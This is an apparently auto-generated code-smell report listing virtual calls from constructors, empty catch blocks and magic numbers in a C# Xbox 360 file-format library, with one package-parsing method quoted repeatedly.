Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Close".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Close".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Dispose".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Close".
Virtual Method Call from Constructor,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The constructor "STFSPackage" calls a virtual method "Dispose".
Virtual Method Call from Constructor,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,The constructor "RSAParams" calls a virtual method "Close".
Virtual Method Call from Constructor,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,The constructor "RSAParams" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,The constructor "RSAParams" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,The constructor "RSAParams" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,The constructor "RSAParams" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,The constructor "RSAParams" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,The constructor "RSAParams" calls a virtual method "ReadBytes".
Virtual Method Call from Constructor,X360.STFS,RSAParams,C:\repos\mtolly_X360\X360\X360\STFS\STFSStuff.cs,RSAParams,The constructor "RSAParams" calls a virtual method "Dispose".
Empty Catch Block,X360.FATX,FATXManagement,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,IsFATX,The method has an empty catch block.
Empty Catch Block,X360.FATX,FATXManagement,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,IsFATX,The method has an empty catch block.
Empty Catch Block,X360.FATX,FATXManagement,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,IsFATX,The method has an empty catch block.
Empty Catch Block,X360.FATX,FATXManagement,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,IsFATX,The method has an empty catch block.
Empty Catch Block,X360.FATX,FATXManagement,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,IsFATX,The method has an empty catch block.
Empty Catch Block,X360.FATX,FATXDrive,C:\repos\mtolly_X360\X360\X360\FATX\Management.cs,extthrd,The method has an empty catch block.
Empty Catch Block,X360.GDFX,GDFFolder,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,xExtract,The method has an empty catch block.
Empty Catch Block,X360.GDFX,GDFImage,C:\repos\mtolly_X360\X360\X360\GDFX\GDFImage.cs,ReadFolder,The method has an empty catch block.
Empty Catch Block,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,DJsIO,The method has an empty catch block.
Empty Catch Block,X360.IO,DJsIO,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,DJsIO,The method has an empty catch block.
Empty Catch Block,X360.IO,Drive,C:\repos\mtolly_X360\X360\X360\IO\DJsIO.cs,MakeHandle,The method has an empty catch block.
Empty Catch Block,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,DeleteTempFiles,The method has an empty catch block.
Empty Catch Block,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,xCheckDirectory,The method has an empty catch block.
Empty Catch Block,X360.Other,VariousFunctions,C:\repos\mtolly_X360\X360\X360\Other\Other.cs,ReadFileType,The method has an empty catch block.
Empty Catch Block,X360.Profile,RecordEntry,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xLoadDetails,The method has an empty catch block.
Empty Catch Block,X360.STFS,STFSPackage,C:\repos\mtolly_X360\X360\X360\STFS\STFSPackage.cs,STFSPackage,The method has an empty catch block.
Magic Number,X360.FATX,FATXEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,FATXEntry,The following statement contains a magic number: try {  	DJsIO xIO = new DJsIO (xData' true);  	xNLen = xIO.ReadByte ();  	if (xNLen == 0xE5 || xNLen == 0xFF || xNLen == 0 || xNLen > 0x2A)  		return;  	byte xatt = (byte)((xIO.ReadByte () >> 4) & 1);  	byte xLen = (byte)(xNLen & 0x3F);  	xName = xIO.ReadString (StringForm.ASCII' xLen);  	xName.IsValidXboxName ();  	xIO.Position = 0x2C;  	xStartBlock = xIO.ReadUInt32 ();  	if (xStartBlock == Constants.FATX32End)  		return;  	xSize = xIO.ReadInt32 ();  	xT1 = xIO.ReadInt32 ();  	xT2 = xIO.ReadInt32 ();  	xT3 = xIO.ReadInt32 ();  	if (xatt == 1)  		xIsFolder = true;  	else if (xSize == 0)  		return;  	xIsValid = true;  }  catch {  	xIsValid = false;  }  
Magic Number,X360.FATX,FATXEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetData,The following statement contains a magic number: xArray.Add ((byte)((IsFolder ? 1 : 0) << 4));  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: try {  	if (xSize < 0x500)  		throw new Exception ();  	xDrive.GetIO ();  	uint[] blocks = Partition.xTable.GetBlocks (xStartBlock);  	if (blocks.Length == 0)  		throw new Exception ();  	xDrive.xActive = false;  	FATXStreamIO io = new FATXStreamIO (this' ref blocks' true);  	uint xBuff = io.ReadUInt32 ();  	if (xBuff != (uint)STFS.PackageMagic.CON && xBuff != (uint)STFS.PackageMagic.LIVE && xBuff != (uint)STFS.PackageMagic.PIRS)  		throw new Exception ();  	io.Position = 0x411;  	xReturn = io.ReadString (StringForm.Unicode' 0x80);  	io.Position = 0x340;  	byte xbase = (byte)(((io.ReadUInt32 () + 0xFFF) & 0xF000) >> 0xC);  	if (io.ReadUInt32 () != (uint)STFS.PackageType.Profile)  		throw new Exception ();  	io.Position = 0x379;  	if (io.ReadByte () != 0x24 || io.ReadByte () != 0)  		throw new Exception ();  	byte idx = (byte)(io.ReadByte () & 3);  	byte[] Desc = io.ReadBytes (5);  	if (idx == 0 || idx == 2) {  		if (xbase != 0xA)  			throw new Exception ();  	}  	else if (idx == 1) {  		if (xbase != 0xB)  			throw new Exception ();  	}  	else  		throw new Exception ();  	io.Position = 0x395;  	STFS.STFSDescriptor xDesc = new X360.STFS.STFSDescriptor (Desc' io.ReadUInt32 ()' io.ReadUInt32 ()' idx);  	int pos = (int)xDesc.GenerateDataOffset (xDesc.DirectoryBlock);  	uint block = xDesc.DirectoryBlock;  	while (pos != -1) {  		for (int i = 0; i < 0x40; i++) {  			if (pos == -1)  				break;  			io.Position = pos + 0x28 + (0x40 * i);  			byte nlen = (byte)(io.ReadByte () & 0x3F);  			if (nlen > 0x28)  				nlen = 0x28;  			io.Position = pos + (0x40 * i);  			if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  				io.Position = pos + (0x40 * i) + 0x2F;  				List<byte> buff = new List<byte> (io.ReadBytes (3));  				buff.Add (0);  				block = BitConv.ToUInt32 (buff.ToArray ()' false);  				pos = -1;  			}  		}  		if (pos != -1) {  			byte shift = xDesc.TopRecord.Index;  			if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  			List<byte> xbuff = new List<byte> (io.ReadBytes (3));  			xbuff.Reverse ();  			xbuff.Insert (0' 3);  			block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  			if (block == Constants.STFSEnd)  				pos = -1;  		}  	}  	if (block == 0xFFFFFF)  		throw new Exception ();  	io.Position = (int)xDesc.GenerateDataOffset (block);  	byte[] databuff = io.ReadBytes (404);  	Profile.UserAccount ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Stock' false);  	if (!ua.Success) {  		ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Kits' false);  		if (!ua.Success)  			throw new Exception ();  	}  	xReturn = ua.GetGamertag ();  	io.Close ();  	xDrive.xActive = false;  	return xReturn;  }  catch {  	xDrive.xActive = false;  	return xReturn;  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: try {  	if (xSize < 0x500)  		throw new Exception ();  	xDrive.GetIO ();  	uint[] blocks = Partition.xTable.GetBlocks (xStartBlock);  	if (blocks.Length == 0)  		throw new Exception ();  	xDrive.xActive = false;  	FATXStreamIO io = new FATXStreamIO (this' ref blocks' true);  	uint xBuff = io.ReadUInt32 ();  	if (xBuff != (uint)STFS.PackageMagic.CON && xBuff != (uint)STFS.PackageMagic.LIVE && xBuff != (uint)STFS.PackageMagic.PIRS)  		throw new Exception ();  	io.Position = 0x411;  	xReturn = io.ReadString (StringForm.Unicode' 0x80);  	io.Position = 0x340;  	byte xbase = (byte)(((io.ReadUInt32 () + 0xFFF) & 0xF000) >> 0xC);  	if (io.ReadUInt32 () != (uint)STFS.PackageType.Profile)  		throw new Exception ();  	io.Position = 0x379;  	if (io.ReadByte () != 0x24 || io.ReadByte () != 0)  		throw new Exception ();  	byte idx = (byte)(io.ReadByte () & 3);  	byte[] Desc = io.ReadBytes (5);  	if (idx == 0 || idx == 2) {  		if (xbase != 0xA)  			throw new Exception ();  	}  	else if (idx == 1) {  		if (xbase != 0xB)  			throw new Exception ();  	}  	else  		throw new Exception ();  	io.Position = 0x395;  	STFS.STFSDescriptor xDesc = new X360.STFS.STFSDescriptor (Desc' io.ReadUInt32 ()' io.ReadUInt32 ()' idx);  	int pos = (int)xDesc.GenerateDataOffset (xDesc.DirectoryBlock);  	uint block = xDesc.DirectoryBlock;  	while (pos != -1) {  		for (int i = 0; i < 0x40; i++) {  			if (pos == -1)  				break;  			io.Position = pos + 0x28 + (0x40 * i);  			byte nlen = (byte)(io.ReadByte () & 0x3F);  			if (nlen > 0x28)  				nlen = 0x28;  			io.Position = pos + (0x40 * i);  			if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  				io.Position = pos + (0x40 * i) + 0x2F;  				List<byte> buff = new List<byte> (io.ReadBytes (3));  				buff.Add (0);  				block = BitConv.ToUInt32 (buff.ToArray ()' false);  				pos = -1;  			}  		}  		if (pos != -1) {  			byte shift = xDesc.TopRecord.Index;  			if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  			List<byte> xbuff = new List<byte> (io.ReadBytes (3));  			xbuff.Reverse ();  			xbuff.Insert (0' 3);  			block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  			if (block == Constants.STFSEnd)  				pos = -1;  		}  	}  	if (block == 0xFFFFFF)  		throw new Exception ();  	io.Position = (int)xDesc.GenerateDataOffset (block);  	byte[] databuff = io.ReadBytes (404);  	Profile.UserAccount ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Stock' false);  	if (!ua.Success) {  		ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Kits' false);  		if (!ua.Success)  			throw new Exception ();  	}  	xReturn = ua.GetGamertag ();  	io.Close ();  	xDrive.xActive = false;  	return xReturn;  }  catch {  	xDrive.xActive = false;  	return xReturn;  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: try {  	if (xSize < 0x500)  		throw new Exception ();  	xDrive.GetIO ();  	uint[] blocks = Partition.xTable.GetBlocks (xStartBlock);  	if (blocks.Length == 0)  		throw new Exception ();  	xDrive.xActive = false;  	FATXStreamIO io = new FATXStreamIO (this' ref blocks' true);  	uint xBuff = io.ReadUInt32 ();  	if (xBuff != (uint)STFS.PackageMagic.CON && xBuff != (uint)STFS.PackageMagic.LIVE && xBuff != (uint)STFS.PackageMagic.PIRS)  		throw new Exception ();  	io.Position = 0x411;  	xReturn = io.ReadString (StringForm.Unicode' 0x80);  	io.Position = 0x340;  	byte xbase = (byte)(((io.ReadUInt32 () + 0xFFF) & 0xF000) >> 0xC);  	if (io.ReadUInt32 () != (uint)STFS.PackageType.Profile)  		throw new Exception ();  	io.Position = 0x379;  	if (io.ReadByte () != 0x24 || io.ReadByte () != 0)  		throw new Exception ();  	byte idx = (byte)(io.ReadByte () & 3);  	byte[] Desc = io.ReadBytes (5);  	if (idx == 0 || idx == 2) {  		if (xbase != 0xA)  			throw new Exception ();  	}  	else if (idx == 1) {  		if (xbase != 0xB)  			throw new Exception ();  	}  	else  		throw new Exception ();  	io.Position = 0x395;  	STFS.STFSDescriptor xDesc = new X360.STFS.STFSDescriptor (Desc' io.ReadUInt32 ()' io.ReadUInt32 ()' idx);  	int pos = (int)xDesc.GenerateDataOffset (xDesc.DirectoryBlock);  	uint block = xDesc.DirectoryBlock;  	while (pos != -1) {  		for (int i = 0; i < 0x40; i++) {  			if (pos == -1)  				break;  			io.Position = pos + 0x28 + (0x40 * i);  			byte nlen = (byte)(io.ReadByte () & 0x3F);  			if (nlen > 0x28)  				nlen = 0x28;  			io.Position = pos + (0x40 * i);  			if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  				io.Position = pos + (0x40 * i) + 0x2F;  				List<byte> buff = new List<byte> (io.ReadBytes (3));  				buff.Add (0);  				block = BitConv.ToUInt32 (buff.ToArray ()' false);  				pos = -1;  			}  		}  		if (pos != -1) {  			byte shift = xDesc.TopRecord.Index;  			if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  			List<byte> xbuff = new List<byte> (io.ReadBytes (3));  			xbuff.Reverse ();  			xbuff.Insert (0' 3);  			block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  			if (block == Constants.STFSEnd)  				pos = -1;  		}  	}  	if (block == 0xFFFFFF)  		throw new Exception ();  	io.Position = (int)xDesc.GenerateDataOffset (block);  	byte[] databuff = io.ReadBytes (404);  	Profile.UserAccount ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Stock' false);  	if (!ua.Success) {  		ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Kits' false);  		if (!ua.Success)  			throw new Exception ();  	}  	xReturn = ua.GetGamertag ();  	io.Close ();  	xDrive.xActive = false;  	return xReturn;  }  catch {  	xDrive.xActive = false;  	return xReturn;  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: try {  	if (xSize < 0x500)  		throw new Exception ();  	xDrive.GetIO ();  	uint[] blocks = Partition.xTable.GetBlocks (xStartBlock);  	if (blocks.Length == 0)  		throw new Exception ();  	xDrive.xActive = false;  	FATXStreamIO io = new FATXStreamIO (this' ref blocks' true);  	uint xBuff = io.ReadUInt32 ();  	if (xBuff != (uint)STFS.PackageMagic.CON && xBuff != (uint)STFS.PackageMagic.LIVE && xBuff != (uint)STFS.PackageMagic.PIRS)  		throw new Exception ();  	io.Position = 0x411;  	xReturn = io.ReadString (StringForm.Unicode' 0x80);  	io.Position = 0x340;  	byte xbase = (byte)(((io.ReadUInt32 () + 0xFFF) & 0xF000) >> 0xC);  	if (io.ReadUInt32 () != (uint)STFS.PackageType.Profile)  		throw new Exception ();  	io.Position = 0x379;  	if (io.ReadByte () != 0x24 || io.ReadByte () != 0)  		throw new Exception ();  	byte idx = (byte)(io.ReadByte () & 3);  	byte[] Desc = io.ReadBytes (5);  	if (idx == 0 || idx == 2) {  		if (xbase != 0xA)  			throw new Exception ();  	}  	else if (idx == 1) {  		if (xbase != 0xB)  			throw new Exception ();  	}  	else  		throw new Exception ();  	io.Position = 0x395;  	STFS.STFSDescriptor xDesc = new X360.STFS.STFSDescriptor (Desc' io.ReadUInt32 ()' io.ReadUInt32 ()' idx);  	int pos = (int)xDesc.GenerateDataOffset (xDesc.DirectoryBlock);  	uint block = xDesc.DirectoryBlock;  	while (pos != -1) {  		for (int i = 0; i < 0x40; i++) {  			if (pos == -1)  				break;  			io.Position = pos + 0x28 + (0x40 * i);  			byte nlen = (byte)(io.ReadByte () & 0x3F);  			if (nlen > 0x28)  				nlen = 0x28;  			io.Position = pos + (0x40 * i);  			if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  				io.Position = pos + (0x40 * i) + 0x2F;  				List<byte> buff = new List<byte> (io.ReadBytes (3));  				buff.Add (0);  				block = BitConv.ToUInt32 (buff.ToArray ()' false);  				pos = -1;  			}  		}  		if (pos != -1) {  			byte shift = xDesc.TopRecord.Index;  			if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  			List<byte> xbuff = new List<byte> (io.ReadBytes (3));  			xbuff.Reverse ();  			xbuff.Insert (0' 3);  			block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  			if (block == Constants.STFSEnd)  				pos = -1;  		}  	}  	if (block == 0xFFFFFF)  		throw new Exception ();  	io.Position = (int)xDesc.GenerateDataOffset (block);  	byte[] databuff = io.ReadBytes (404);  	Profile.UserAccount ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Stock' false);  	if (!ua.Success) {  		ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Kits' false);  		if (!ua.Success)  			throw new Exception ();  	}  	xReturn = ua.GetGamertag ();  	io.Close ();  	xDrive.xActive = false;  	return xReturn;  }  catch {  	xDrive.xActive = false;  	return xReturn;  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: try {  	if (xSize < 0x500)  		throw new Exception ();  	xDrive.GetIO ();  	uint[] blocks = Partition.xTable.GetBlocks (xStartBlock);  	if (blocks.Length == 0)  		throw new Exception ();  	xDrive.xActive = false;  	FATXStreamIO io = new FATXStreamIO (this' ref blocks' true);  	uint xBuff = io.ReadUInt32 ();  	if (xBuff != (uint)STFS.PackageMagic.CON && xBuff != (uint)STFS.PackageMagic.LIVE && xBuff != (uint)STFS.PackageMagic.PIRS)  		throw new Exception ();  	io.Position = 0x411;  	xReturn = io.ReadString (StringForm.Unicode' 0x80);  	io.Position = 0x340;  	byte xbase = (byte)(((io.ReadUInt32 () + 0xFFF) & 0xF000) >> 0xC);  	if (io.ReadUInt32 () != (uint)STFS.PackageType.Profile)  		throw new Exception ();  	io.Position = 0x379;  	if (io.ReadByte () != 0x24 || io.ReadByte () != 0)  		throw new Exception ();  	byte idx = (byte)(io.ReadByte () & 3);  	byte[] Desc = io.ReadBytes (5);  	if (idx == 0 || idx == 2) {  		if (xbase != 0xA)  			throw new Exception ();  	}  	else if (idx == 1) {  		if (xbase != 0xB)  			throw new Exception ();  	}  	else  		throw new Exception ();  	io.Position = 0x395;  	STFS.STFSDescriptor xDesc = new X360.STFS.STFSDescriptor (Desc' io.ReadUInt32 ()' io.ReadUInt32 ()' idx);  	int pos = (int)xDesc.GenerateDataOffset (xDesc.DirectoryBlock);  	uint block = xDesc.DirectoryBlock;  	while (pos != -1) {  		for (int i = 0; i < 0x40; i++) {  			if (pos == -1)  				break;  			io.Position = pos + 0x28 + (0x40 * i);  			byte nlen = (byte)(io.ReadByte () & 0x3F);  			if (nlen > 0x28)  				nlen = 0x28;  			io.Position = pos + (0x40 * i);  			if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  				io.Position = pos + (0x40 * i) + 0x2F;  				List<byte> buff = new List<byte> (io.ReadBytes (3));  				buff.Add (0);  				block = BitConv.ToUInt32 (buff.ToArray ()' false);  				pos = -1;  			}  		}  		if (pos != -1) {  			byte shift = xDesc.TopRecord.Index;  			if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  			List<byte> xbuff = new List<byte> (io.ReadBytes (3));  			xbuff.Reverse ();  			xbuff.Insert (0' 3);  			block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  			if (block == Constants.STFSEnd)  				pos = -1;  		}  	}  	if (block == 0xFFFFFF)  		throw new Exception ();  	io.Position = (int)xDesc.GenerateDataOffset (block);  	byte[] databuff = io.ReadBytes (404);  	Profile.UserAccount ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Stock' false);  	if (!ua.Success) {  		ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Kits' false);  		if (!ua.Success)  			throw new Exception ();  	}  	xReturn = ua.GetGamertag ();  	io.Close ();  	xDrive.xActive = false;  	return xReturn;  }  catch {  	xDrive.xActive = false;  	return xReturn;  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: try {  	if (xSize < 0x500)  		throw new Exception ();  	xDrive.GetIO ();  	uint[] blocks = Partition.xTable.GetBlocks (xStartBlock);  	if (blocks.Length == 0)  		throw new Exception ();  	xDrive.xActive = false;  	FATXStreamIO io = new FATXStreamIO (this' ref blocks' true);  	uint xBuff = io.ReadUInt32 ();  	if (xBuff != (uint)STFS.PackageMagic.CON && xBuff != (uint)STFS.PackageMagic.LIVE && xBuff != (uint)STFS.PackageMagic.PIRS)  		throw new Exception ();  	io.Position = 0x411;  	xReturn = io.ReadString (StringForm.Unicode' 0x80);  	io.Position = 0x340;  	byte xbase = (byte)(((io.ReadUInt32 () + 0xFFF) & 0xF000) >> 0xC);  	if (io.ReadUInt32 () != (uint)STFS.PackageType.Profile)  		throw new Exception ();  	io.Position = 0x379;  	if (io.ReadByte () != 0x24 || io.ReadByte () != 0)  		throw new Exception ();  	byte idx = (byte)(io.ReadByte () & 3);  	byte[] Desc = io.ReadBytes (5);  	if (idx == 0 || idx == 2) {  		if (xbase != 0xA)  			throw new Exception ();  	}  	else if (idx == 1) {  		if (xbase != 0xB)  			throw new Exception ();  	}  	else  		throw new Exception ();  	io.Position = 0x395;  	STFS.STFSDescriptor xDesc = new X360.STFS.STFSDescriptor (Desc' io.ReadUInt32 ()' io.ReadUInt32 ()' idx);  	int pos = (int)xDesc.GenerateDataOffset (xDesc.DirectoryBlock);  	uint block = xDesc.DirectoryBlock;  	while (pos != -1) {  		for (int i = 0; i < 0x40; i++) {  			if (pos == -1)  				break;  			io.Position = pos + 0x28 + (0x40 * i);  			byte nlen = (byte)(io.ReadByte () & 0x3F);  			if (nlen > 0x28)  				nlen = 0x28;  			io.Position = pos + (0x40 * i);  			if (io.ReadString (StringForm.ASCII' nlen) == "Account") {  				io.Position = pos + (0x40 * i) + 0x2F;  				List<byte> buff = new List<byte> (io.ReadBytes (3));  				buff.Add (0);  				block = BitConv.ToUInt32 (buff.ToArray ()' false);  				pos = -1;  			}  		}  		if (pos != -1) {  			byte shift = xDesc.TopRecord.Index;  			if (xDesc.BlockCount >= Constants.BlockLevel [1]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L2) + 0x14 + (shift << 0xC);  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			if (xDesc.BlockCount >= Constants.BlockLevel [0]) {  				io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L1) + 0x14 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  				shift = (byte)((io.ReadByte () >> 6) & 1);  			}  			io.Position = (int)xDesc.GenerateHashOffset (block' X360.STFS.TreeLevel.L0) + 0x15 + (xDesc.ThisType == STFS.STFSType.Type0 ? 0 : (shift << 0xC));  			List<byte> xbuff = new List<byte> (io.ReadBytes (3));  			xbuff.Reverse ();  			xbuff.Insert (0' 3);  			block = BitConv.ToUInt32 (xbuff.ToArray ()' true);  			if (block == Constants.STFSEnd)  				pos = -1;  		}  	}  	if (block == 0xFFFFFF)  		throw new Exception ();  	io.Position = (int)xDesc.GenerateDataOffset (block);  	byte[] databuff = io.ReadBytes (404);  	Profile.UserAccount ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Stock' false);  	if (!ua.Success) {  		ua = new X360.Profile.UserAccount (new DJsIO (databuff' true)' X360.Profile.AccountType.Kits' false);  		if (!ua.Success)  			throw new Exception ();  	}  	xReturn = ua.GetGamertag ();  	io.Close ();  	xDrive.xActive = false;  	return xReturn;  }  catch {  	xDrive.xActive = false;  	return xReturn;  }  
Magic Number,X360.FATX,FATXFileEntry,C:\repos\mtolly_X360\X360\X360\FATX\Entries.cs,GetSTFSName,The following statement contains a magic number: try {  	if (xSize < 0x500)  		throw new Exception ();  	xDrive.GetIO ();  	uint[] blocks = Partition.xTable.GetBlocks (xStartBlock);  	if (blocks.Length == 0)  		throw new Exception ();  	xDrive.xActive = false;  	FATXStreamIO io = new FATXStreamIO (this' ref blocks' true);  	uint xBuff = io.ReadUInt32 ();  	if (xBuff != (uint)STFS.PackageMagic.CON && xBuff != (uint)STFS.PackageMagic.LIVE && xBuff != (uint)STFS.PackageMagic.PIRS)  		throw new Exception ();  	io.Position = 0x411;  	xReturn = io.ReadString (StringForm.Unicode' 0x80);  	io.Position = 0x340;  	byte xbase = (byte)(((io.ReadUInt32 () + 0xFFF) & 0xF000) >> 0xC);  	if (io.ReadUInt32 () != (uint)STFS.PackageType.Profile)  		throw new Exception ();  	io.Position = 0x379;  	if (io.ReadByte () != 0x24 || io.ReadByte () != 0)  		throw new Exception ();  	byte idx = (byte)(io.ReadByte () & 3);  	byte[] Desc = io.ReadBytes (5);  	if (idx == 0 || idx == 2) {  		if (xbase != 0xA)  			throw new Exception ();  	}  	else if (idx == 1) {  		if (xbase != 0xB)  			throw new Exception ();  	}  	else  		throw new Exception ();  	io.Position = 0x395;  	STFS.STFSDescriptor xDesc = new X360.STFS.STFSDescriptor (Desc' io.ReadUInt32 ()' io.ReadUInt32 ()' idx);  	int pos = (int)xDesc.GenerateDataOffset 